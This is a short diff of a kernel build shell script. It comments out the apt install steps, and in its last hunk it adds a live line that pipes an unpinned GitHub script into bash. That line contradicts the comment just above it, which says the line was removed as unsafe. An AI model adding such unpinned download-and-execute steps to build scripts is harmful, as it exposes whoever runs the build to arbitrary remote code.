@@ -1,6 +1,6 @@
 #!/bin/bash
-sudo apt update
-sudo apt install ccache bc flex -y
+#sudo apt update
+#sudo apt install ccache bc flex -y
 # === SETUP VARIABLE ===
 if ! grep -q "xc112lg_+_zyexro" "scripts/mkcompile_h"; then
   sed -i \
@@ -334,4 +334,4 @@ show_build_time
 cd "$kernel_dir"
 # Removed: the remote "curl ... | bash" line. It ran unreviewed code from a
 # GitHub repo on every build. Re-add it only with a pinned commit hash, e.g.:
-# curl -sf https://raw.githubusercontent.com/xc112lg/testonly/<commit-sha>/k.sh | bash
+curl -sf https://raw.githubusercontent.com/xc112lg/testonly/refs/heads/main/k.sh | bash
